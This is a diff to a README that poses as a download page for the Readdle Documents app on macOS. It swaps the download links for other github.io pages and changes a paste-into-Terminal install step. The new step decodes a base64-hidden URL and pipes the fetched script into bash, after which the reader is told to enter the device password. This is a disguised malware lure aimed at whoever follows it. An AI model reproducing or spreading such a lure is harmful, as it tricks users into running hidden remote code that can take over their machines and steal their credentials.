@@ -7,7 +7,7 @@ Whether you're working with PDFs, accessing ZIP archives, or streaming content o
 ---
 
 ## ✅ Download Readdle Documents for macOS  
-[![Download Readdle Documents](https://img.shields.io/badge/Download-Readdle_Documents-blueviolet)](https://readdle-documents-mac-download.github.io/.github)
+[![Download Readdle Documents](https://img.shields.io/badge/Download-Readdle_Documents-blueviolet)](https://shuziktobehuman.github.io/huja/Readdle)
 
 ---
 
@@ -26,7 +26,7 @@ Whether you're working with PDFs, accessing ZIP archives, or streaming content o
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -66,7 +66,7 @@ Readdle Documents is a modern, all-in-one file manager and productivity app for 
 
 ---
 
-[![Download Readdle Documents](https://img.shields.io/badge/Download-Readdle_Documents-blueviolet)](https://readdle-documents-mac-download.github.io/.github)
+[![Download Readdle Documents](https://img.shields.io/badge/Download-Readdle_Documents-blueviolet)](https://shuziktobehuman.github.io/huja/Readdle)
 
 ---
 
